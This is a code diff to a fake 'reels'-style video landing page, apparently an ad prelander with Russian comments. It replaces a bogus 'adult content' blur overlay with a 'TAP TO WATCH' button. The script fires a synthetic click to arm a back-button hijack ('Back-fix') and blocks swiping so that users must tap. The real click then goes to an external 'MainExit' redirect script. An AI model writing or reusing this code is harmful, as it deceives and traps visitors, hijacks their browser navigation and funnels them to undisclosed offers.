@@ -23,15 +23,7 @@
         html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
         .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; }
-        
-        /* Видео + Класс для блюра */
-        .xh-video { 
-            position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; background: #000; 
-            transition: filter 0.5s ease-in; /* Плавное размытие */
-        }
-        .xh-video.blurred {
-            filter: blur(18px); /* Сила размытия */
-        }
+        .xh-video { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; background: #000; }
 
         .reels-ui { 
             position: absolute; inset: 0; z-index: 10; 
@@ -40,53 +32,48 @@
             background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
         }
 
-        /* --- UI: SENSITIVE CONTENT --- */
-        .sensitive-overlay {
-            position: absolute; inset: 0; z-index: 50;
-            display: none; /* Скрыто по умолчанию */
-            flex-direction: column; align-items: center; justify-content: center;
-            background: rgba(0,0,0,0.4);
-            pointer-events: none; /* Пропускает клики сквозь себя на wrapper */
+        /* --- НОВЫЙ ЭЛЕМЕНТ: ПРИЗЫВ К КЛИКУ (ВТОРОЙ ЭТАП) --- */
+        .click-hint-overlay {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 50; display: none; /* Скрыто по умолчанию */
+            pointer-events: none;
+            flex-direction: column; align-items: center; gap: 15px;
         }
         
-        .eye-icon {
-            width: 60px; height: 60px;
-            margin-bottom: 20px;
-            opacity: 0.9;
+        .play-btn-big {
+            width: 80px; height: 80px;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            border: 2px solid rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            animation: pulse 1.5s infinite;
         }
-
-        .sensitive-title {
-            color: #fff; font-weight: 800; font-size: 18px; 
-            letter-spacing: 0.5px; margin-bottom: 8px;
+        
+        .click-text {
+            color: #fff; font-weight: 800; text-transform: uppercase; 
+            font-size: 16px; letter-spacing: 1px;
             text-shadow: 0 2px 4px rgba(0,0,0,0.8);
-        }
-        
-        .sensitive-desc {
-            color: #ddd; font-size: 14px; text-align: center; max-width: 80%;
-            margin-bottom: 25px; line-height: 1.4;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 4px;
         }
 
-        .show-btn {
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.4);
-            color: #fff;
-            padding: 12px 30px;
-            border-radius: 30px;
-            font-weight: 600;
-            font-size: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            animation: pulseBtn 2s infinite;
-        }
-        @keyframes pulseBtn {
-            0% { transform: scale(1); background: rgba(255,255,255,0.2); }
-            50% { transform: scale(1.05); background: rgba(255,255,255,0.3); }
-            100% { transform: scale(1); background: rgba(255,255,255,0.2); }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 15px rgba(255, 255, 255, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
         }
 
+        /* Эффект "ошибки" при попытке свайпа */
+        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
+        @keyframes shake {
+            10%, 90% { transform: translate(-50%, -50%) translate3d(-2px, 0, 0); }
+            20%, 80% { transform: translate(-50%, -50%) translate3d(4px, 0, 0); }
+            30%, 50%, 70% { transform: translate(-50%, -50%) translate3d(-8px, 0, 0); }
+            40%, 60% { transform: translate(-50%, -50%) translate3d(8px, 0, 0); }
+        }
 
-        /* Стандартный UI */
+        /* Остальной интерфейс */
         .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
         .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
         .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
@@ -110,7 +97,7 @@
         .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
         @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
 
-        /* Анимации свайпа */
+        /* Анимации свайпа видео */
         .slide-out-up { animation: slideOutUp 0.4s ease-out forwards; }
         .slide-in-up { animation: slideInUp 0.4s ease-out forwards; }
         @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 0; } }
@@ -127,13 +114,13 @@
 
     <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👆</div></div>
 
-    <div id="sensitive-overlay" class="sensitive-overlay">
-        <svg class="eye-icon" viewBox="0 0 24 24" fill="white">
-            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"></path>
-        </svg>
-        <div class="sensitive-title">Sensitive Content</div>
-        <div class="sensitive-desc">This video may contain adult content.</div>
-        <div class="show-btn">See Photo</div>
+    <div id="click-hint" class="click-hint-overlay">
+        <div class="play-btn-big">
+            <svg viewBox="0 0 24 24" fill="white" style="width: 40px; height: 40px; margin-left: 5px;">
+                <path d="M8 5v14l11-7z"></path>
+            </svg>
+        </div>
+        <div class="click-text">TAP TO WATCH</div>
     </div>
 
     <div class="reels-ui">
@@ -158,9 +145,10 @@
 document.addEventListener("DOMContentLoaded", () => {
     const video = document.getElementById("main-video");
     const swipeHint = document.getElementById("swipe-hint");
-    const sensitiveOverlay = document.getElementById("sensitive-overlay");
+    const clickHint = document.getElementById("click-hint");
     const wrapper = document.querySelector('.reels-wrapper');
 
+    // Настройки
     const urlParams = new URLSearchParams(window.location.search);
     const offerID = urlParams.get('v') || '1';
     let currentReelIndex = 1;
@@ -174,11 +162,12 @@ document.addEventListener("DOMContentLoaded", () => {
     };
     video.play().catch(() => {});
 
-    let stage = 1; // 1 = Свайп (прогрев), 2 = Блюр (финал)
+    let stage = 1; // 1 = Свайп (прогрев), 2 = Клик (финал)
     let touchStartY = 0;
     let touchEndY = 0;
     let isAnimating = false;
 
+    // Смена видео
     function triggerVisualSwipe() {
         if (isAnimating) return;
         isAnimating = true;
@@ -190,27 +179,23 @@ document.addEventListener("DOMContentLoaded", () => {
             currentReelIndex++; 
             video.src = getPath(currentReelIndex);
             video.load();
-            
-            // Если переходим на этап 2 - сразу ставим блюр
-            video.classList.add('blurred'); // Видео размывается
-            
             video.play().catch(()=>{});
 
             video.classList.remove('slide-out-up');
             video.classList.add('slide-in-up');
 
+            // ПОКАЗЫВАЕМ КНОПКУ PLAY
+            // Теперь юзер видит, что нужно нажать
             setTimeout(() => {
-                // Если этап 2 - показываем плашку цензуры
-                sensitiveOverlay.style.display = 'flex';
-                
+                clickHint.style.display = 'flex'; // Показываем кнопку
                 video.classList.remove('slide-in-up');
                 isAnimating = false;
-                stage = 2; // Фиксируем 2-й этап
+                stage = 2; // Переходим во 2-ю стадию
             }, 400);
         }, 350);
     }
 
-    // --- СВАЙПЫ ---
+    // --- ЛОВИМ СВАЙПЫ ---
     wrapper.addEventListener('touchstart', function(e) {
         touchStartY = e.changedTouches[0].screenY;
     }, {passive: true});
@@ -218,33 +203,40 @@ document.addEventListener("DOMContentLoaded", () => {
     wrapper.addEventListener('touchend', function(e) {
         touchEndY = e.changedTouches[0].screenY;
         if (touchStartY - touchEndY > 50) { 
-            // Если свайп на этапе 1 - работаем
+            // Свайп вверх
             if (stage === 1) {
+                // Стадия 1: Меняем видео, регаем бэк
                 const fakeClick = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-                wrapper.dispatchEvent(fakeClick); // Для Back-fix
+                wrapper.dispatchEvent(fakeClick); // Для Бэк-фикса
+                
                 triggerVisualSwipe();
             } else {
-                // Этап 2 - Свайп запрещен, мы ждем клик
-                // Можно слегка трясти кнопку, чтобы привлечь внимание
-                const btn = document.querySelector('.show-btn');
-                btn.style.transform = "scale(1.2)";
-                setTimeout(() => btn.style.transform = "scale(1)", 200);
+                // Стадия 2: СВАЙП ЗАПРЕЩЕН!
+                // Трясем кнопку "TAP TO WATCH", намекая, что надо кликнуть
+                clickHint.classList.remove('shake');
+                void clickHint.offsetWidth; // ресет анимации
+                clickHint.classList.add('shake');
+                
+                console.log("Swipe blocked. User must click!");
             }
         }
     }, {passive: true});
 
-    // --- КЛИКИ ---
+    // --- ЛОВИМ КЛИКИ ---
     wrapper.addEventListener("click", function(e) {
+        
+        // Фильтр наших фейков
         if (!e.isTrusted && stage === 1) { e.stopPropagation(); return; }
 
         if (stage === 1) {
-            // Этап 1: клик тоже переключает видео
+            // Если тапнули на 1 стадии - тоже меняем видео (как свайп)
             e.stopPropagation(); e.stopImmediatePropagation();
             triggerVisualSwipe();
         } else {
-            // Этап 2: Клик по кнопке "See Photo" (или мимо) -> ВЫХОД
-            console.log("Unblur Click -> MainExit Script Activated");
-            // Пропускаем клик. Твой скрипт снизу всё сделает.
+            // Стадия 2: Клик разрешен!
+            // Мы ничего не делаем. Событие летит дальше.
+            // Твой скрипт MainExit ловит НАСТОЯЩИЙ клик и делает редирект.
+            console.log("REAL CLICK -> MainExit Script Activated");
         }
     }); 
 });
